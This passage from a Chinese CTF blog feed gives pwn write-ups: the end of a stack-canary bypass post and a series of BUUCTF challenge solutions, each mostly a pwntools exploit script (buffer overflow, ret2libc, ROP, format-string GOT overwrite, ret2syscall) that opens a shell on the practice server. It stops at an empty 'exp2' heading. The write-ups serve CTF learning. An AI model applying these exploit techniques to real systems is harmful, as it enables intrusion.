class="hljs-number">16</span>)<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br><span class="hljs-attribute">system</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4008</span>DA<br><span class="hljs-attribute">payload</span> = &#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xdeadbeef) + p<span class="hljs-number">64</span>(system)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以像上面一样直接泄露canary了</p>
<h3 id="例题：-BJDCTF-2nd-r2t4"><a href="#例题：-BJDCTF-2nd-r2t4" class="headerlink" title="例题：[BJDCTF 2nd]r2t4"></a>例题：[BJDCTF 2nd]r2t4</h3><p>程序比较简单，分析下<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/28.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/28.png"><span class="image-caption">img</span></a><br>存在溢出存在格式化字符串漏洞有canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/29.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/29.png"><span class="image-caption">img</span></a><br>有后门<br>直接改写__stack_chk_fail@got为backdoor<br>这个题限制不多，可以直接用fmtstr_payload模块一把梭<br>当然也可以手动构造<br>但是我还没做手动构造打的（懒🐕</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28676</span>)<br><span class="hljs-comment">#p = process(&quot;./r2t4&quot;)</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./r2t4&quot;</span>)<br><span class="hljs-attribute">libc</span> = elf.libc<br><span class="hljs-attribute">stack_check</span> = <span class="hljs-number">0</span>x<span class="hljs-number">601018</span><br><span class="hljs-attribute">flag_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400626</span><br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;stack_check:flag_addr&#125;).ljust(<span class="hljs-number">40</span>,&#x27;a&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<p>以上就是我对于canary保护的绕过姿势的总结，可能还有我暂时没有涉及到的，也欢迎师傅们提点我一下，这篇博客也算是多天没学习以来的一个新开端吧<br>文中所有的例题和我做分享时的ppt已经上传<a href="https://github.com/N0vice21/Bypass_canary_demo">github</a></p>
<p>参考链接：<br><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://ctf-wiki.org/pwn/linux/mitigation/canary/">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>buu05</title>
    <url>/2021/05/09/2021-05-09-buu05/</url>
    <content><![CDATA[<h1 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h1><h3 id="二十六、wustctf2020-getshell"><a href="#二十六、wustctf2020-getshell" class="headerlink" title="二十六、wustctf2020_getshell"></a>二十六、wustctf2020_getshell</h3><p>一道简单题，直接exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28677</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span>+p32(<span class="hljs-number">0x0804851B</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十七、mrctf2020-easyoverflow"><a href="#二十七、mrctf2020-easyoverflow" class="headerlink" title="二十七、mrctf2020_easyoverflow"></a>二十七、mrctf2020_easyoverflow</h3><p>虽然checksec完，保护全开了，但是程序很简单，真的只是溢出覆盖即可，就不多说了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28551</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十八、cmcc-pwnme1"><a href="#二十八、cmcc-pwnme1" class="headerlink" title="二十八、cmcc_pwnme1"></a>二十八、cmcc_pwnme1</h3><p>这题，本来是平常的ret2libc的，但是，靠，给坑了</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509212554-1622863156087.png"></p>
<p>是的，这里给了个“后门函数”！，假的，害我一直想为什么不能获取，以为是不是接收出了问题。原因却是home里面是不存在flag的，怎么可能获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27186</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr=<span class="hljs-number">0x08048624</span><br>p.sendlineafter(<span class="hljs-string">&quot;6. Exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xA8</span>+p32(puts_plt)+p32(addr)+p32(puts_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr ----&gt;&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload =<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十九、jarvisoj-level1"><a href="#二十九、jarvisoj-level1" class="headerlink" title="二十九、jarvisoj_level1"></a>二十九、jarvisoj_level1</h3><p>常规checksec一下</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509215951-1622863179022.png"></p>
<p>发现什么都没开，第一想法就是注入shellcode，结果。。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220210-1622863188055.png"></p>
<p>结果ida里面竟然确实是给了buf的地址，再加上</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220530-1622863189908.png"></p>
<p>嗯，好家伙，直接shellcode了，然后。。。远程不通，本地通了，没想明白，跑去百度了，结果发现，远程连接，竟然是先输入，再输出栈上的buf地址，靠！然后方法就变成了ret2libc了</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220817-1622863191858.png"></p>
<p>这波竟然是给的附件不准确，见识到了！就跟ida里面栈偏移可能会错一样，以后多多注意自己动手进行调试和连接</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26819</span>)<br><span class="hljs-comment">#p=process(&#x27;./level1&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-string">context.os=&#x27;linux&#x27;</span><br><span class="hljs-string">context.arch=&#x27;i386&#x27;</span><br><span class="hljs-string">p.recvuntil(&quot;this:0x&quot;)</span><br><span class="hljs-string">buf_addr=int(p.recv(8),16)</span><br><span class="hljs-string">print hex(buf_addr)</span><br><span class="hljs-string">shellcode=asm(shellcraft.sh())</span><br><span class="hljs-string">payload=(shellcode).ljust(0x8c,&#x27;a&#x27;)+p32(buf_addr)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&#x27;write addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十、bjdctf-2020-babystack2"><a href="#三十、bjdctf-2020-babystack2" class="headerlink" title="三十、bjdctf_2020_babystack2"></a>三十、bjdctf_2020_babystack2</h3><p>常规checksec</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212002.png"></p>
<p>保护没开几个，进入ida静态分析一波，</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212030.png"></p>
<p>代码很简单，输入一个数字，不能超过10，然后这个数值作为后续输入的大小，并且能看左边有给后门函数，那么就是溢出劫持rip即可，认真观察，输入的nbytes前面是int，后面却是unsigned了，所以存在整型溢出，输入一个负数，即可变为很大的整数</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26091</span>)<br>get_shell=<span class="hljs-number">0x0400726</span><br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(get_shell)<br>p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十一、jarvisoj-level3-x64"><a href="#三十一、jarvisoj-level3-x64" class="headerlink" title="三十一、jarvisoj_level3_x64"></a>三十一、jarvisoj_level3_x64</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516114609-1621136841078.png"></p>
<p>程序很简单，应该是道rop，有溢出点，有write泄露函数，这题考点应该是在于是64位程序，使用寄存器传参，而write的参数需要三个寄存器才行，我第一个想到的是ret2csu，刚好有三个前三个寄存器，没想到，没利用成功，不知道为什么。有师傅知道的话，恳请指点一番！感激不尽！</p>
<p>然后就是百度了一下，发现这题有趣，使用ROPgadget可以找到rdi和rsi两个寄存器，而第三个rdx寄存不需要去控制，里面的值已经存有200，可以直接使用了，所以就是正常构造rop即可</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516115336.png"></p>
<p>所以这题得到的就是，要多观察我们需要构造的寄存器里面的值是否已经可以使用，需不需要额外构造</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25077</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pppppp_ret=<span class="hljs-number">0x4006aa</span>     <span class="hljs-comment">#pop_rbx_rbp_r12_r13_r14_r15_ret</span><br>mov_rdx_rsi_edi=<span class="hljs-number">0x400690</span><br>ret=<span class="hljs-number">0x400499</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pp_ret=<span class="hljs-number">0x4006b1</span>    <span class="hljs-comment">#pop_rsi_r15_ret</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload=&#x27;a&#x27;*0x88+p64(pppppp_ret)</span><br><span class="hljs-string">payload+=p64(0)*2+p64(ret)+p64(8)+p64(read_got)+p64(1)</span><br><span class="hljs-string">payload+=p64(mov_rdx_rsi_edi)+p64(write_plt)+p64(main)</span><br><span class="hljs-string">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">write=u64(p.recv(6).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-string">log.info(&quot;wirte addr:&quot;+hex(write))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x88</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)			<br>payload += p64(pp_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>)	<br>payload += p64(write_plt)					<br>payload += p64(main)									<br>p.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload)<br>read = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))	<br>log.info(<span class="hljs-string">&quot;read addr:&quot;</span>+<span class="hljs-built_in">hex</span>(read))<br>libc = LibcSearcher(<span class="hljs-string">&quot;read&quot;</span>,read)<br>libc_base = read - libc.dump(<span class="hljs-string">&quot;read&quot;</span>)<br>system = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input:&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十二、jarvisoj-level4"><a href="#三十二、jarvisoj-level4" class="headerlink" title="三十二、jarvisoj_level4"></a>三十二、jarvisoj_level4</h3><p>32位的rop，就没有上面那么麻烦了，直接在栈上写就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="三十三、picoctf-2018-rop-chain"><a href="#三十三、picoctf-2018-rop-chain" class="headerlink" title="三十三、picoctf_2018_rop chain"></a>三十三、picoctf_2018_rop chain</h3><p>常规32位rop即可getshell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27038</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>,payload)<br>printf=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf addr:&quot;</span>+<span class="hljs-built_in">hex</span>(printf))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf)<br>libc_base=printf-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>续：突然想去百度一下，看看那个给的后门函数是不是有用（因为我是没去用的，直接就是ret2libc了），结果发现，师傅们的解法是去利用已经给的函数，去让flag被打印出来，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27036</span>)<br><br>win_function1 = <span class="hljs-number">0x080485CB</span><br>win_function2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(win_function1)<br>payload += p32(win_function2) + p32(flag) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="三十四、picoctf-2018-buffer-overflow-1"><a href="#三十四、picoctf-2018-buffer-overflow-1" class="headerlink" title="三十四、picoctf_2018_buffer overflow 1"></a>三十四、picoctf_2018_buffer overflow 1</h3><p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25801</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+p32(<span class="hljs-number">0x80485cb</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;string: &quot;</span>,payload)<br>p.recvall()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十五、jarvisoj-test-your-memory"><a href="#三十五、jarvisoj-test-your-memory" class="headerlink" title="三十五、jarvisoj_test_your_memory"></a>三十五、jarvisoj_test_your_memory</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154820.png"></p>
<p>checksec一下，然后进入ida</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154920.png"></p>
<p>这题的溢出点在scanf，然后，这里的检查保护，似乎没什么用处，并不能影响到退栈时候，我们控制eip，所以不用管，然后后门函数给了，直接用就好了。</p>
<p>这题跟之前有道类似，这次我学聪明了，很早就nc看了，远程和本地不一样，远程先要我们进行输入，这里算是一个点；还有个就是，调用程序函数打印flag的时候，返回地址处要写存在的地址，不可以随便填写，否则无法得到flag。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522155322.png" style="zoom:80%;">

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27280</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x080485BD</span><br>flag=<span class="hljs-number">0x80487e0</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x17</span>+p32(system)+p32(flag)+p32(flag)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十六、cmcc-simplerop"><a href="#三十六、cmcc-simplerop" class="headerlink" title="三十六、cmcc_simplerop"></a>三十六、cmcc_simplerop</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172402.png"></p>
<p>checksec一下，然后拖进ida。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522172444.png" style="zoom:80%;">

<p>符号表满满当当，静态链接了。一般考虑为ret2syscall。也确实，ROPgadget寻找了一番，syscall需要的都有了。除了没有/bin/sh，最开始我是直接寻找sh字符串的，因为有的题目sh也是可以getshell的，但是这题不行。就必须要找地方输入/bin/sh了，这个地方当然是.bss段啦</p>
<p>然后就是这边的溢出IDA里面有误，需要gdb里面进行寻找，偏移为32才对。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522162230.png"></p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>int_80=<span class="hljs-number">0x0806EEF0</span><br>sh=<span class="hljs-number">0x080eafe1</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)+p32(ppp_ret)+p32(<span class="hljs-number">8</span>)+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(int_80)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第一个写法，是我转后写的样子，但是我的不行，出现下面的报错打不通。去百度了，但是由于博客园审核，没能查看到博文</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172906.png"></p>
<p>这边似乎是execve的条件未达成，可是我与上面的exp差别只在于int 80的地址不同，我的是ROPgadget中找到的，而上面exp里面的int 80，是我在一个师傅的wp里面发现的，两者不一样</p>
<p>exp2：</p>
